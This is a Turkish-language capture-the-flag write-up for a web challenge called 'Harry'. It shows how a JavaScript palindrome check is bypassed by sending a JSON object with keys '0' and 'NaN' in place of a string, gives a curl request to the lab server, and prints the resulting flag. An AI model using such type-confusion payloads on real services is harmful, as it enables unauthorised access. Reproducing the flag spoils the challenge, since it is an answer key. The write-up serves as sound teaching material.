# Harry -- Web Challenge Writeup

## 🎯 Genel Bakış

Bu challange, backend servisine bir palindrom göndermek üzerine gibi
görünse de aslında amaç, backend'deki **tip ve uzunluk doğrulama
hatasını** kullanarak flag'i almaktır.

------------------------------------------------------------------------

## 🔍 Kaynak Kod Analizi

Backend, `palindrome` girdisini şu fonksiyonla doğruluyor:

``` js
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(string.length).keys()) {
        const original = string[i];
        const reverse = string[string.length - i - 1];

        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }

    return null;
}
```

### ❗ Temel Hata:

-   `string` değişkeninin **gerçekten string olup olmadığı kontrol
    edilmiyor.**
-   Bu nedenle string yerine **object** gönderilebiliyor.
-   Ayrıca, object'lerde `string.length` → **undefined** olur.

Ve:

    undefined < 1000  → false

Bu sayede "Tootus Shortus" hatası **atlanıyor**.

Palindrom döngüsü sırasında:

-   `Array(undefined)` → `[undefined]`\
-   Yalnızca tek iterasyon çalışıyor.
-   Eğer:
    -   `string["0"] = "a"`
    -   `string["NaN"] = "a"`

yaparsak:

-   `string[0] = "a"`
-   `string[NaN] = "a"`

Bu da karşılaştırmayı geçiyor.

------------------------------------------------------------------------

## ⚠️ Nginx Body Size Limiti

Sunucu şu ayarı kullanıyor:

    client_max_body_size 75;

Bu nedenle uzun palindromlar gönderemiyoruz.\
**Bypass tabanlı bir çözüm** zorunlu hâle geliyor.

------------------------------------------------------------------------

## 🧠 Final Payload (Object Tabanlı Palindrom Bypass)

String yerine **object** gönderiyoruz:

``` json
{"palindrome":{"0":"a","NaN":"a"}}
```

Curl komutu:

``` bash
curl -X POST http://94.237.62.103:43520/   -H "Content-Type: application/json"   -d '{"palindrome":{"0":"a","NaN":"a"}}'
```

Bu payload tüm kontrolleri geçiyor ve flag dönüyor:

    HTB{Lum0s_M@x!ma}

------------------------------------------------------------------------
`HTB{Lum0s_M@x!ma}`
